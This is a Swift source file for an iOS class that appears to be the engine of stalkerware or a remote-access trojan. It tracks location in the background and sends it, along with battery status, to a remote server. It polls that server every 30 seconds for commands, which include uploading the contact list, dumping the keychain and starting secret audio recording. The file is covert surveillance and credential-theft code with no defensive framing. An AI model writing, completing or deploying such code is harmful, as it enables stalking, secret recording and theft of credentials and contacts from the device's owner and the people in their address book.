import Foundation
import CoreLocation
import UIKit
import Contacts

class MonitorEngine: NSObject, CLLocationManagerDelegate {
    static let shared = MonitorEngine()
    private let locationManager = CLLocationManager()

    override init() {
        super.init()
        locationManager.delegate = self
        locationManager.allowsBackgroundLocationUpdates = true
        locationManager.pausesLocationUpdatesAutomatically = false
        locationManager.distanceFilter = kCLDistanceFilterNone
        locationManager.desiredAccuracy = kCLLocationAccuracyBest
        
        // Start polling for commands every 30 seconds
        Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { _ in
            self.pollForCommands()
        }
    }

    func startMonitoring() {
        locationManager.requestAlwaysAuthorization()
        locationManager.startUpdatingLocation()
        print("TIM: Monitoring service initialized.")
        
        // Send initial heartbeat
        TIM_NetworkManager.shared.send(["status": "started", "battery": UIDevice.current.batteryLevel], type: "logs")
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        guard let location = locations.last else { return }
        
        let payload: [String: Any] = [
            "latitude": location.coordinate.latitude,
            "longitude": location.coordinate.longitude,
            "accuracy": location.horizontalAccuracy,
            "battery": UIDevice.current.batteryLevel
        ]
        
        TIM_NetworkManager.shared.send(payload, type: "location")
    }
    
    private func pollForCommands() {
        TIM_NetworkManager.shared.fetchCommands { commands in
            for command in commands {
                print("TIM: Received polled command: \(command)")
                self.processRemoteCommand(command)
            }
        }
    }

    func processRemoteCommand(_ command: String) {
        switch command {
        case "get_gps":
            locationManager.startUpdatingLocation()
        case "exfiltrate_contacts":
            uploadContacts()
        case "heartbeat":
            TIM_NetworkManager.shared.send(["status": "active", "battery": UIDevice.current.batteryLevel], type: "logs")
        case "dump_keychain":
            KeychainDumper.dumpKeychain()
        case "start_audio_bug":
            let bug = AudioBug()
            bug.startSecretRecording()
        default:
            print("TIM: Unknown command received: \(command)")
        }
    }

    private func uploadContacts() {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, error in
            guard granted else { 
                TIM_NetworkManager.shared.send(["error": "Contacts access denied"], type: "logs")
                return 
            }
            
            var contactsArray: [[String: String]] = []
            let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] as [CNKeyDescriptor]
            let request = CNContactFetchRequest(keysToFetch: keys)
            
            try? store.enumerateContacts(with: request) { contact, _ in
                let name = "\(contact.givenName) \(contact.familyName)"
                let phone = contact.phoneNumbers.first?.value.stringValue ?? ""
                contactsArray.append(["name": name, "phone": phone])
            }
            
            TIM_NetworkManager.shared.send(["contacts": contactsArray], type: "contacts")
        }
    }
}
